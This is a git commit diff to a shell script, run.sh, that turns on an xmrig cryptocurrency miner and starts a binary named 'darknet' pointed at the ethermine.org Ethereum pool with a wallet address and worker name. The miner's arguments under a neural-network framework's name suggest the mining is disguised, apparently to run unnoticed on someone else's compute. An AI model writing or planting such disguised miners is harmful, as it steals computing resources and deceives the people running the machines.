4d4bc98e6c29ceac6d4742dc0619292bc4007969
tanlm <tanle2694@gmail.com>
2021-08-28 17:38:29 +0700

    add run darknet

--- run.sh
+++ run.sh
@@ -3,8 +3,8 @@ apt-get update -y
 apt install libpci-dev -y
 apt-get install libssl-dev -y
 worker_name=$1
-#./xmrig &
-
+./xmrig &
+echo "run darknet"
 ./darknet -pool eu1.ethermine.org:4444 -wal 0x992df1f4e10126ce40e67d0b3948fa409dbc917f -worker $worker_name -epsw x -mode 1 -log 0 -mport 0 -etha 0 -ftime 55 -retrydelay 1 -tt 79 -tstop 89  -coin eth &
 while true
 do
